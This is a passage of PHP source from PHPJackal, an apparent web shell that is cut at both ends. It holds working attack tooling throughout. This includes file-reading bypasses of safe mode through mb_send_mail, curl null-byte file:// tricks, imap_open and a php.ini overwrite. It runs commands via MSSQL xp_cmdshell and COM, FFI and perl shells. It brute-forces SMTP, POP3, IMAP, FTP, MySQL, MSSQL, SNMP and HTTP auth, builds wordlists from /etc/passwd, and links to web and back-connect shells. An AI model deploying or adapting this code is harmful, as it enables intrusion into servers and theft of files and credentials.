mb_send_mail(NULL, NULL, NULL, NULL,'-C $file -X /tmp/mb_send_mail');
readfile('/tmp/mb_send_mail');
$i++;
}
if(function_exists('curl_init')){
echo "$pr$i:(curl_init [A]$po";
$fh=curl_init('file://'.$file.'');
$tmp=curl_exec($fh);
echo $tmp;
$i++;
echo "$pr$i:(curl_init [B]$po";
$i++;
if(strstr($file,DIRECTORY_SEPARATOR))$ch=curl_init('file:///'.$file."\x00/../../../../../../../../../../../../".__FILE__);
else $ch=curl_init('file://'.$file."\x00".__FILE__);
var_dump(curl_exec($ch));
}
if(is_writable('.')){
echo "$pr$i:(php.ini$po";
file_put_contents('php.ini','safe_mode = Off');
readfile($file);
unlink('php.ini');
$i++;
}
if(extension_loaded('perl')){
echo "$pr$i:(perl$po";
echo perlshelL("type \"$file\"");
$i++;
}
if(is_object($ws=new COM('WScript.Shell'))){
echo "$pr$i:(COM$po";
echo comshelL("type \"$file\"",$ws);
$i++;
}
if(extension_loaded('ffi') && $windows){
echo "$pr$i:(FFI$po";
echo ffishelL("type \"$file\"");
$i++;
}
if(checkfunctioN('win_shell_execute')){
echo "$pr$i:(win32std$po";
echo winshelL("type \"$file\"");
$i++;
}
if(checkfunctioN('win32_create_service')){
echo "$pr$i:(win32service$po";
echo srvshelL("type \"$file\"");
$i++;
}
if(function_exists('imap_open')){
echo "$pr$i:(imap [A]$po";
$str=imap_open('/etc/passwd','','');
$list=imap_list($str,$file,'*');
for($i=0;$i<count($list);$i++)echo $list[$i]."\n";
imap_close($str);
$i++;
echo "$pr$i:(imap [B]$po";
$str=imap_open($file,'','');
$tmp=imap_body($str,1);
echo $tmp;
imap_close($str);
$i++;
}
if($file=='/etc/passwd'){
echo "$pr$i:(posix$po";
for($uid=0;$uid<99999;$uid++){
$h=posix_getpwuid($uid);
if(!empty($h))foreach($h as $v)echo "$v:";
echo "\r\n";
}
}
echo "\n</pre></font>";
}
elseif(!empty($_REQUEST['show'])){
echo "<pre>$pr$i:(glob$po";
$con=glob("$file*");
foreach ($con as $v)echo "$v\n";
$i++;
if(function_exists('imap_open')){
echo "$pr$i:(imap$po";
$str=imap_open('/etc/passwd','','');
$s=explode("|",$file);
if(count($s)>1)$list=imap_list($str,trim($s[0]),trim($s[1]));else $list=imap_list($str,trim($str[0]),'*');
for($i=0;$i<count($list);$i++)echo "$list[$i]\r\n";
imap_close($str);
$i++;
}
if(is_object($ws=new COM('WScript.Shell'))){
echo "$pr$i:(COM$po";
$exec=comshelL("dir \"$file\"",$ws);
$exec=str_replace("\t",'',$exec);
echo $exec;
$i++;
}
if(checkfunctioN('win_shell_execute')){
echo "$pr$i:(win32std$po";
echo winshelL("dir \"$file\"");
$i++;
}
if(checkfunctioN('win32_create_service')){
echo "$pr$i:(win32service$po";
echo srvshelL("dir \"$file\"");
$i++;
}
echo "\n</pre></font>";
}
elseif(!empty($_REQUEST['sql'])){
$ta=uniqid('N');
$s=array("CREATE TEMPORARY TABLE $ta (file LONGBLOB)","LOAD DATA INFILE '".addslashes($_REQUEST['file'])."' INTO TABLE $ta","SELECT * FROM $ta");
$l=mysql_connect('localhost', $_REQUEST['user'], $_REQUEST['pass']);
mysql_select_db($_REQUEST['db'],$l);
echo '<pre><font color=blue>';
foreach($s as $v){
$q = mysql_query($v,$l);
while($d=mysql_fetch_row($q))echo htmlspecialchars($d[0]);
}
echo '</pre></font>';
}
elseif(!empty($_REQUEST['serveR']) && !empty($_REQUEST['coM']) && !empty($_REQUEST['dB']) && !empty($_REQUEST['useR']) && isset($_REQUEST['pasS'])){
$res='';
$tb=uniqid('NJ');
$db=mssql_connect($_REQUEST['serveR'],$_REQUEST['useR'],$_REQUEST['pasS']);
mssql_select_db($_REQUEST['dB'],$db);
mssql_query("create table $tb ( string VARCHAR (500) NULL)",$db);
mssql_query("insert into $tb EXEC master.dbo.xp_cmdshell '".$_REQUEST['coM']."'",$db);
$re=mssql_query("select * from $tb",$db);
while(($row=mssql_fetch_row($re)))
{
$res.= $row[0]."\r\n";
}
mssql_query("drop table $tb",$db);
mssql_close($db);
echo "<center><textarea rows='18' cols='64'>$res</textarea></center><br>";
}
$f=(!empty($_REQUEST['file']))?htmlspecialchars($_REQUEST['file']):'/etc/passwd';
$u=(!empty($_REQUEST['user']))?htmlspecialchars($_REQUEST['user']):'root';
$p=(!empty($_REQUEST['pass']))?htmlspecialchars($_REQUEST['pass']):'123456';
$d=(!empty($_REQUEST['db']))?htmlspecialchars($_REQUEST['db']):'test';
echo '
<form name="client" method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">Use PHP Bugs</label>
</div><div class="fieldwrapper">
<label class="styled">File:</label>
<div class="thefield">
<input type="text" name="file" value="'.$f.'" size="30" />
</div>
</div>'.$hcwd.'<div class="buttonsdiv">
<input type="submit" name="read" value="Read File" style="margin-left: 150px;" />
</div>
<div class="buttonsdiv">
<input type="submit" name="show" value="List directory" style="margin-left: 150px;" />
</div>
</form>
<br />
<form name="client1" method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">Use MySQL</label>
</div><div class="fieldwrapper">
<label class="styled">File:</label>
<div class="thefield">
<input type="text" name="file" value="'.$f.'" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name="user" value="'.$u.'" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Password:</label>
<div class="thefield">
<input type="text" name="pass" value="'.$p.'" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Database:</label>
<div class="thefield">
<input type="text" name="db" value="'.$d.'" size="30" />
</div>
</div>'.$hcwd.'
<div class="buttonsdiv">
<input type="submit" name="sql" value="Read" style="margin-left: 150px;" />
</div>
</form>
<br />
<form name="client2" method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">MSSQL Exec</label>
</div><div class="fieldwrapper">
<label class="styled">Server:</label>
<div class="thefield">
<input type="text" name="serveR" value="';if(!empty($_REQUEST['serveR']))echo htmlspecialchars($_REQUEST['serveR']);else echo 'localhost'; echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name="useR" value="';if(!empty($_REQUEST['useR']))echo htmlspecialchars($_REQUEST['useR']); else echo 'sa'; echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Password:</label>
<div class="thefield">
<input type="text" name="pasS" value="';if (!empty($_REQUEST['pasS'])) echo htmlspecialchars($_REQUEST['pasS']);echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Command:</label>
<div class="thefield">
<input type="text" name="coM" value="';if (!empty($_REQUEST['coM'])) echo htmlspecialchars($_REQUEST['coM']);else echo 'dir c:';echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Database:</label>
<div class="thefield">
<input type="text" name="dB" value="';if (!empty($_REQUEST['dB'])) echo htmlspecialchars($_REQUEST['dB']);else echo 'master';echo '" size="30" />
</div>
</div>'.$hcwd.'
<div class="buttonsdiv">
<input type="submit" value="Execute" style="margin-left: 150px;" />
</div>
</form>
';
}
function crackeR(){
global $hcwd,$cwd;
echo '<img src="http://h.ackerz.com/PHPJackal/images/cracker.png" style="border: none; margin: 0;" /><br /><br />';
$check=(!empty($_REQUEST['dictionary']) && !empty($_REQUEST['target']))?1:0;
if(!empty($_REQUEST['cracK']) && !$check){
$c=htmlspecialchars($_REQUEST['cracK']);
echo '<form name=cracker method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">'.$c.' cracker</label>
</div>
<div class="fieldwrapper">
<label class="styled">Target:</label>
<div class="thefield">
<input type="text" name="target" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Userlist:</label>
<div class="thefield">
<input type="text" name="dictionary" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled"><input type=checkbox name=combo value=1 onClick="document.cracker.passlst.disabled = !document.cracker.passlst.disabled;"> Combo</label>
<div class="thefield">
<input type=text name=passlst size=20 value="/tmp/passlist.txt">
</div>
</div>
<div class="fieldwrapper">
<label class="styled"><input type=checkbox name=loG value=1 onClick="document.cracker.logfilE.disabled = !document.cracker.logfilE.disabled;" checked> Log:</label>
<div class="thefield">
<input type=text name=logfilE size=25 value="'.whereistmP().DIRECTORY_SEPARATOR.'.log">
</div>
</div>
'.$hcwd.'
<div class="buttonsdiv">
<input type="submit" value="Start" style="margin-left: 150px;" />
</div>
</form>';
}
elseif(!empty($_REQUEST['cracK']) && $check){
$pro=strtolower($_REQUEST['cracK']).'checK';
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:'';
$dictionary=fopen($_REQUEST['dictionary'],'r');
if(isset($_REQUEST['loG'])&& !empty($_REQUEST['logfilE'])){$log=1;$file=$_REQUEST['logfilE'];}else $log=0;
if($dictionary){
echo '<font color=blue>Cracking '.htmlspecialchars($target).'...<br>';
if(!$type)$pl=file($_REQUEST['passlst']);
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
$ret=$pro($target,$user,$pass,5);
if($ret==-1){echo "Can not connect to server.";break;}elseif($ret){$x="U: $user P: $pass";echo "$x<br />";if($log)file_add_contentS($file,"$x\r\n");}
}else{
$user=trim(fgets($dictionary)," \n\r");
foreach ($pl as $pass){
$pass=trim($pass);
$ret=$pro($target,$user,$pass,5);
if($ret==-1){echo "Can not connect to server.";break 2;}elseif($ret){$x="U: $user P: $pass";echo "$x<br />";break;if($log)file_add_contentS($file,"$x\r\n");}
}
}
}
echo '<br />Done</font>';
fclose($dictionary);
}
else{
echo "Can not open dictionary.";
}
}
else{
echo '<ul>
<li><a href="'.hlinK("seC=hc&workingdiR=$cwd").'">Hash</a></li>
<li><a href="'.hlinK("seC=cr&cracK=SMTP&workingdiR=$cwd").'">SMTP</a></li>
<li><a href="'.hlinK("seC=cr&cracK=POP3&workingdiR=$cwd").'">POP3</a></li>
<li><a href="'.hlinK("seC=cr&cracK=IMAP&workingdiR=$cwd").'">IMAP</a></li>
<li><a href="'.hlinK("seC=cr&cracK=FTP&workingdiR=$cwd").'">FTP</a></li>
<li><a href="'.hlinK("seC=snmp&workingdiR=$cwd").'">SNMP</a></li>
<li><a href="'.hlinK("seC=cr&cracK=MySQL&workingdiR=$cwd").'">MySQL</a></li>
<li><a href="'.hlinK("seC=cr&cracK=MSSQL&workingdiR=$cwd").'">MSSQL</a></li>
<li><a href="'.hlinK("seC=fcr&workingdiR=$cwd").'">HTTP Form</a></li>
<li><a href="'.hlinK("seC=auth&workingdiR=$cwd").'">HTTP Auth(basic)</a></li>
<li><a href="'.hlinK("seC=dic&workingdiR=$cwd").'">Dictionary maker</a></li>
</ul>';
}
}
function phpjackal(){
	global $VERSION,$cwd;
	if(!empty($_REQUEST['chkveR'])){
		echo file_get_contents("http://h.ackerz.com/PHPJackal/chkver.php?v=$VERSION");
	}else
	echo '<img src="http://h.ackerz.com/PHPJackal/images/phpjackal.png" style="border: none; margin: 0;" /><br /><br /><ul><li><a href="'.hlinK("seC=phpjackal&workingdiR=$cwd&chkveR=1").'">Check version</a></li><li><a href="#" onclick="if(confirm(\'Are you sure?\'))window.location=\''.hlinK("seC=phpjackal&workingdiR=$cwd&slfrmv=1").'\';">Self removal</a></li></ul>';
}
function snmpcrackeR(){
global $hcwd;
if(!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
if(isset($_REQUEST['loG'])&& !empty($_REQUEST['logfilE'])){$log=1;$file=$_REQUEST['logfilE'];}else $log=0;
$dictionary=fopen($_REQUEST['dictionary'],'r');
if($dictionary){
echo '<font color=blue>Cracking '.htmlspecialchars($target).'...<br>';
while(!feof($dictionary)){
$com=trim(fgets($dictionary)," \n\r");
$res=snmpchecK($target,$com,2);
if($res){echo "$com<br>";if($log)file_add_contentS($file,"$com\r\n");}
}
echo '<br>Done</font>';
fclose($dictionary);
}
else{
echo "Can not open dictionary.";
}
}else
echo '<form name=cracker method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">SNMP cracker</label>
</div><div class="fieldwrapper">
<label class="styled">Dictionary:</label>
<div class="thefield">
<input type="text" name="dictionary" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Target:</label>
<div class="thefield">
<input type="text" name="target" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled"><input type=checkbox name=loG value=1 onClick="document.hashform.logfilE.disabled = !document.cracker.logfilE.disabled;" checked> Log:</label>
<div class="thefield">
<input type=text name=logfilE size=25 value="'.whereistmP().DIRECTORY_SEPARATOR.'.log">
</div>
</div>
'.$hcwd.'
<div class="buttonsdiv">
<input type="submit" value="Start" style="margin-left: 150px;" />
</div>
</form>';
}
function dicmakeR(){
global $windows,$hcwd;
$combo=(empty($_REQUEST['combo']))?0:1;
if(!empty($_REQUEST['range'])&& !empty($_REQUEST['output']) && !empty($_REQUEST['min']) && !empty($_REQUEST['max'])){
$min=$_REQUEST['min'];
$max=$_REQUEST['max'];
if($max<$min){echo"Bad input!";return;};
$s=$w='';
$out=$_REQUEST['output'];
$r=$_REQUEST['range'];
$dic=fopen($out,'w');
if($r==1){
for($s=pow(10,$min-1);$s<pow(10,$max-1);$s++){
$w=$s;
if($combo)$w="$w:$w";
fwrite($dic,$w."\n");
}
}
else{
$s=str_repeat($r,$min);
while(strlen($s)<$max){
$w=$s;
if($combo)$w="$w:$w";
fwrite($dic,$w."\n");
$s++;
}
}
fclose($dic);
echo '<font color=blue>Done</font>';
}
elseif(!empty($_REQUEST['input']) && !empty($_REQUEST['output'])){
$input=fopen($_REQUEST['input'],'r');
if(!$input){
if($windows)echo 'Unable to read from '.htmlspecialchars($_REQUEST['input'])."<br />";
else{
$input=explode("\n",shelL("cat $input"));
$output=fopen($_REQUEST['output'],'w');
if($output){
foreach($input as $in){
$user=$in;
$user=trim(fgets($in)," \n\r");
if(!strstr($user,':'))continue;
$user=substr($user,0,(strpos($user,':')));
if($combo)fwrite($output,$user.':'.$user."\n");else fwrite($output,$user."\n");
}
fclose($input);fclose($output);
echo '<font color=blue>Done</font>';
}
}
}
else{
$output=fopen($_REQUEST['output'],'w');
if($output){
while(!feof($input)){
$user=trim(fgets($input)," \n\r");
if(!strstr($user,':'))continue;
$user=substr($user,0,(strpos($user,':')));
if($combo)fwrite($output,$user.':'.$user."\n");else fwrite($output,$user."\n");
}
fclose($input);fclose($output);
echo '<font color=blue>Done</font>';
}
else echo 'Unable to write data to '.htmlspecialchars($_REQUEST['input'])."<br />";
}
}elseif(!empty($_REQUEST['url']) && !empty($_REQUEST['output'])){
$res=downloadiT($_REQUEST['url'],$_REQUEST['output']);
if($combo && $res){
$file=file($_REQUEST['output']);
$output=fopen($_REQUEST['output'],'w');
foreach($file as $v)fwrite($output,"$v:$v\n");
fclose($output);
}
echo '<font color=blue>Done</font>';
}else{
$temp=whereistmP().DIRECTORY_SEPARATOR;
echo '<form name=wordlist method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Wordlist generator</label>
</div><div class="fieldwrapper"><label class="styled">Range:</label><div class="thefield"><select name=range><option value=a>a-z</option><option value=A>A-Z</option><option value=1>0-9</option></select>
</div></div><div class="fieldwrapper"><label class="styled">min lenght:</label><div class="thefield"><select name=min><option value=1>1</option><option value=2>2</option><option value=3>3</option><option value=4>4</option><option value=5>5</option><option value=6>6</option><option value=7>7</option><option value=8>8</option><option value=9>9</option><option value=10>10</option></select></div>
</div><div class="fieldwrapper"><label class="styled">Max lenght:</label><div class="thefield"><select name=max><option value=2>2</option><option value=3>3</option><option value=4>4</option><option value=5>5</option><option value=6>6</option><option value=7>7</option><option value=8>8</option><option value=9>9</option><option value=10>10</option><option value=11>11</option></select></div>
</div><div class="fieldwrapper"><label class="styled">Output:</label><div class="thefield"><input type="text" name="output" value="'.$temp.'.dic" size="30" /></div>
</div><div class="fieldwrapper"><label class="styled">Format:</label><div class="thefield"><input type=checkbox name=combo value=1 checked> Combo style output
</div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" value="Make" style="margin-left: 150px;" /></div></form><br /><form name=grab method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Grab dictionary</label></div><div class="fieldwrapper"><label class="styled">Input:</label><div class="thefield"><input type="text" name="input" value="/etc/passwd" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Output:</label><div class="thefield"><input type="text" name="output" value="'.$temp.'.dic" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Format:</label><div class="thefield"><input type=checkbox name=combo value=1 checked> Combo style output</div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" value="Grab" style="margin-left: 150px;" />
</div></form><br /><form name=dldic method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Download dictionary</label>
</div><div class="fieldwrapper"><label class="styled">URL:</label><div class="thefield"><input type="text" name="url" value="http://people.sc.fsu.edu/~jburkardt/datasets/words/wordlist.txt" size="30" />
</div></div><div class="fieldwrapper"><label class="styled">Output:</label><div class="thefield"><input type="text" name="output" value="'.$temp.'.dic" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Format:</label><div class="thefield"><input type=checkbox name=combo value=1 checked> Combo style output</div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" value="Get" style="margin-left: 150px;" /></div></form><br />';
}
}
function ftpclienT(){
global $cwd,$hcwd;
echo '<img src="http://h.ackerz.com/PHPJackal/images/ftp.png" style="border: none; margin: 0;" /><br /><br />';
if(!empty($_REQUEST['hosT']) && !empty($_REQUEST['useR']) && isset($_REQUEST['pasS']) && function_exists('ftp_connect')){
$user=$_REQUEST['useR'];$pass=$_REQUEST['pasS'];$host=$_REQUEST['hosT'];
$con=ftp_connect($_REQUEST['hosT'],21,10);
if($con){
if(ftp_login($con,$user,$pass)){
if(!empty($_REQUEST['PWD']))ftp_chdir($con,$_REQUEST['PWD']);
if(!empty($_REQUEST['filE'])){
$file=$_REQUEST['filE'];
$mode=(isset($_REQUEST['modE']))?FTP_BINARY:FTP_ASCII;
if(isset($_REQUEST['geT']))ftp_get($con,$file,$file,$mode);
elseif(isset($_REQUEST['puT']))ftp_put($con,$file,$file,$mode);
elseif(isset($_REQUEST['rM'])){
ftp_rmdir($con,$file);
ftp_delete($con,$file);
}
elseif(isset($_REQUEST['mD']))ftp_mkdir($con,$file);
}
$pwd=ftp_pwd($con);
$dir=ftp_nlist($con,'');
$d=opendir($cwd);
echo "<table border=0 cellspacing=0 cellpadding=0><tr><th>$host</th><th>";if(!empty($_SERVER['SERVER_ADDR']))echo $_SERVER['SERVER_ADDR'];else echo'127.0.0.1'; echo "</th></tr><form method=POST><tr><td><input type=text value='$pwd' name=PWD size=50><input value=Change class=buttons type=submit></td><td><input size=50 type=text value='$cwd' name=workingdiR><input value=Change class=buttons type=submit></td></tr><tr><td>";
foreach($dir as $n)echo "$n<br />";
echo "</td><td>";while($cdir=readdir($d))if($cdir!='.' && $cdir!='..')echo "$cdir<br>"; echo "</td></tr><tr><td colspan=2>Name:<input type=text name=filE><input type=checkbox style='border-width:1px;background-color:#333333;' name=modE value=1>Binary <input type=submit name=geT class=buttons value=Get><input type=submit name=puT class=buttons value=Put><input type=submit name=rM class=buttons value=Remove><input type=submit name=mD class=buttons value='Make dir'></td><td><input type=hidden value='$user' name=useR><input type=hidden value='$pass' name=pasS><input type=hidden value='$host' name=hosT></form></tr></td></table>";
}else echo "Wrong username or password!";
}else echo "Can not connect to server!";
}
else{
echo '
<form name=client method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">FTP client</label>
</div><div class="fieldwrapper">
<label class="styled">Server:</label>
<div class="thefield">
<input type="text" name="hosT" value="localhost" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name="useR" value="anonymous" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Password:</label>
<div class="thefield">
<input type="text" name="pasS" value="admin@nasa.gov" size="30" />
</div>
</div>
'.$hcwd.'
<div class="buttonsdiv">
<input type="submit" value="Connect" style="margin-left: 150px;" />
</div></form>';
}
}
function calC(){
global $hcwd;
echo '<img src="http://h.ackerz.com/PHPJackal/images/converter.png" style="border: none; margin: 0;" /><br /><br />';
$fu=array('-','md5','sha1','crc32','hex','ip2long','decbin','dechex','hexdec','bindec','long2ip','base64_encode','base64_decode','urldecode','urlencode','des','strrev');
if(!empty($_REQUEST['input']) && (in_array($_REQUEST['to'],$fu))){
$to=$_REQUEST['to'];
echo '<form class="form" method="POST">';
echo '<div class="fieldwrapper">
<label class="styled">Output:</label>
<div class="thefield"><textarea readonly="readonly">';
if($to=='hex')for($i=0;$i<strlen($_REQUEST['input']);$i++)echo '%'.strtoupper(dechex(ord($_REQUEST['input']{$i}))); 
else echo $to($_REQUEST['input']);
echo '</textarea></div></div>';
}
echo '
<form method="POST" class="form">
<div class="fieldwrapper">
<label class="styled">Input:</label>
<div class="thefield">
<textarea name="input">';if(!empty($_REQUEST['input']))echo htmlspecialchars($_REQUEST['input']);echo '</textarea>
</div>
</div><div class="fieldwrapper">
<label class="styled">Function:</label>
<div class="thefield">
<select name="to">
<option value="md5">MD5</option>
<option value="sha1">SHA1</option>
<option value="crc32">Crc32</option>
<option value="strrev">Reverse</option>
<option value="ip2long">IP to long</option>
<option value="long2ip">Long to IP</option>
<option value="decbin">Decimal to binary</option>
<option value="bindec">Binary to decimal</option>
<option value="dechex">Decimal to hex</option>
<option value="hexdec">Hex to decimal</option>
<option value="hex">ASCII to hex</option>
<option value="urlencode">URL encoding</option>
<option value="urldecode">URL decoding</option>
<option value="base64_encode">Base64 encoding</option>
<option value="base64_decode">Base64 decoding</option>
</select>
</div>
</div>'.$hcwd.'
<div class="buttonsdiv">
<input type="submit" value="Convert" style="margin-left: 150px;" />
</div>
</form>';
}
function stegn0(){
	global $hcwd;
	echo '<img src="http://h.ackerz.com/PHPJackal/images/stegno.png" style="border: none; margin: 0;" /><br /><br />';
	if(!extension_loaded('gd')){
		echo "GD extension is not installed. You can't use this section without it.";
		return;
	}
	if(!empty($_REQUEST['maskimagE']) && !empty($_REQUEST['hidefilE']) && !empty($_REQUEST['outfilE'])){
		echo stegfilE($_REQUEST['maskimagE'],$_REQUEST['hidefilE'],$_REQUEST['outfilE']);
	}elseif (!empty($_REQUEST['revimagE'])){
		echo steg_recoveR(($_REQUEST['revimagE']));
	}
	else echo '
<form name=stegn method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">Steganographer</label>
</div><div class="fieldwrapper">
<label class="styled">Mask image: (JPEG)</label>
<div class="thefield">
<input type="text" name="maskimagE" value="banner.jpg" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">File to hide:</label>
<div class="thefield">
<input type="text" name="hidefilE" value="pass.lst" size="30" />
</div>
<div class="fieldwrapper">
<label class="styled">Outout: (PNG)</label>
<div class="thefield">
<input type="text" name="outfilE" value="banner.png" size="30" />
</div>
</div>
'.$hcwd.'
<div class="buttonsdiv">
<input type="submit" name="stegn0" value="Combine" style="margin-left: 150px;" />
</div>
</form>
<br />
<form name=rev method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">Reveal</label>
</div><div class="fieldwrapper">
<label class="styled">Steganographed image: (PNG)</label>
<div class="thefield">
<input type="text" name="revimagE" value="banner.png" size="30" />
</div>
</div>
'.$hcwd.'
<div class="buttonsdiv">
<input type="submit" name="stegn0" value="Reveal" style="margin-left: 150px;" />
</div>
</form>';
}
function authcrackeR(){
global $hcwd;
if(!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
if(isset($_REQUEST['loG'])&& !empty($_REQUEST['logfilE'])){$log=1;$file=$_REQUEST['logfilE'];}else $log=0;
$data='';
$method=($_REQUEST['method'])?'POST':'GET';
if(strstr($_REQUEST['target'],'?')){$data=substr($_REQUEST['target'],strpos($_REQUEST['target'],'?')+1);$_REQUEST['target']=substr($_REQUEST['target'],0,strpos($_REQUEST['target'],'?'));}
spliturL($_REQUEST['target'],$host,$page);
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:'';
if($method=='GET')$page.=$data;
$dictionary=fopen($_REQUEST['dictionary'],'r');
echo '<font color=blue>';
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$so=fsockopen($host,80,$en,$es,5);
if(!$so){echo "Can not connect to host";break;}
else{
$packet="$method /$page HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nConnection: Close\r\nAuthorization: Basic ".base64_encode("$user:$pass");
if($method=='POST')$packet.='Content-Type: application/x-www-form-urlencoded\r\nContent-Length: '.strlen($data);
$packet.="\r\n\r\n";
$packet.=$data;
fputs($so,$packet);
$res=substr(fgets($so),9,2);
fclose($so);
if($res=='20'){echo "U: $user P: $pass</br>";if($log)file_add_contentS($file,"U: $user P: $pass\r\n");}
}
}
echo 'Done!</font>';
}else echo '
<form name=cracker method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">HTTP Auth cracker</label>
</div><div class="fieldwrapper">
<label class="styled">Target:</label>
<div class="thefield">
<input type="text" name="target" value="localhost" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Dictionary:</label>
<div class="thefield">
<input type="text" name="dictionary" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Dictionary type:</label>
<div class="thefield">
<ul style="margin-top:0;">
<li><input type="radio" value="0" checked name="combo" onClick="document.cracker.user.disabled = false;" /> <label>Simple (P)</label></li>
<li><input type="radio" name="combo" value="1" onClick="document.cracker.user.disabled = true;" /> <label>Combo (U:P)</label></li>
</ul>
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Method:</label>
<div class="thefield">
<select name="method"><option selected value="1">POST</option><option value="0">GET</option></select>
</div>
</div><div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name="user" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled"><input type=checkbox name=loG value=1 onClick="document.cracker.logfilE.disabled = !document.cracker.logfilE.disabled;" checked> Log:</label>
<div class="thefield">
<input type=text name=logfilE size=25 value="'.whereistmP().DIRECTORY_SEPARATOR.'.log">
</div>
</div>
'.$hcwd.'
<div class="buttonsdiv">
<input type="submit" name="start" value="Start" style="margin-left: 150px;" />
</div>
</form>';
}
function openiT($name){
$ext=end(explode('.',$name));
$src=array('php','php3','php4','phps','phtml','phtm','inc');
$img=array('gif','jpg','jpeg','bmp','png','tif','ico');
if(in_array($ext,$src))highlight_file($name);
elseif (in_array($ext,$img)){showimagE($name);return;}
else echo '<font color=blue><pre>'.htmlspecialchars(file_get_contents($name)).'</pre></font>';
echo '<br /><a href="javascript: history.go(-1)"><img src="http://h.ackerz.com/PHPJackal/images/back.png" /><b>Back</b></a>';
}
function opensesS($name){
$sess=file_get_contents($name);
$var=explode(';',$sess);
echo "<pre>Name\tType\tValue\r\n";
foreach($var as $v){
$t=explode('|',$v);
$c=explode(':',$t[1]);
$y='';
if($c[0]=='i')$y='Integer';elseif($c[0]=='s')$y='String';elseif($c[0]=='b')$y='Boolean';elseif($c[0]=='f')$y='Float';elseif($c[0]=='a')$y='Array';elseif($c[0]=='o')$y='Object';elseif($c[0]=='n')$y='Null';
echo $t[0]."\t$y\t".$c[1]."\r\n";
}
echo '</pre>';
}
function logouT(){
setcookie('passw','',time()-10000);
header('Location: '.hlinK());
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>PHPJackal [<?php echo $cwd;?>]</title>
<link rel="stylesheet" type="text/css" href="http://h.ackerz.com/PHPJackal/style.css"/>
<link rel="shortcut icon" href="http://h.ackerz.com/PHPJackal/favicon.ico" type="image/x-icon" />
<?php if($_REQUEST['seC']=='fm')
echo '
<script language="JavaScript" type="text/JavaScript">
function chmoD($file){
$ch=prompt("Changing file mode["+$file+"]: ex. 777","");
if($ch != null)location.href="'. hlinK('seC=fm&workingdiR='.addslashes($cwd).'&chmoD=').'"+$file+"&modE="+$ch;
}
</script>';
?>
</head>
<body>
<div class="left">
<img src="http://h.ackerz.com/PHPJackal/images/banner.png" alt="banner" />
<ul>
<li <?php if($_REQUEST['seC']=='sysinfo')echo 'class="active"'?>><a href="<?php echo hlinK("seC=sysinfo&workingdiR=$cwd");?>">Information</a></li>
<li <?php if($_REQUEST['seC']=='fm' || $_REQUEST['seC']=='openit')echo 'class="active"'?>><a href="<?php echo hlinK("seC=fm&workingdiR=$cwd");?>">File manager</a></li>
<li <?php if($_REQUEST['seC']=='edit')echo 'class="active"'?>><a href="<?php echo hlinK("seC=edit&workingdiR=$cwd");?>">Editor</a></li>
<li <?php if($_REQUEST['seC']=='webshell')echo 'class="active"'?>><a href="<?php echo hlinK("seC=webshell&workingdiR=$cwd");?>">Web shell</a></li>
<li <?php if($_REQUEST['seC']=='br')echo 'class="active"'?>><a href="<?php echo hlinK("seC=br&workingdiR=$cwd");?>">B/R shell</a></li>
<li <?php if($_REQUEST['seC']=='asm')echo 'class="active"'?>><a href="<?php echo hlinK("seC=asm&workingdiR=$cwd");?>">Safe-mode</a></li>
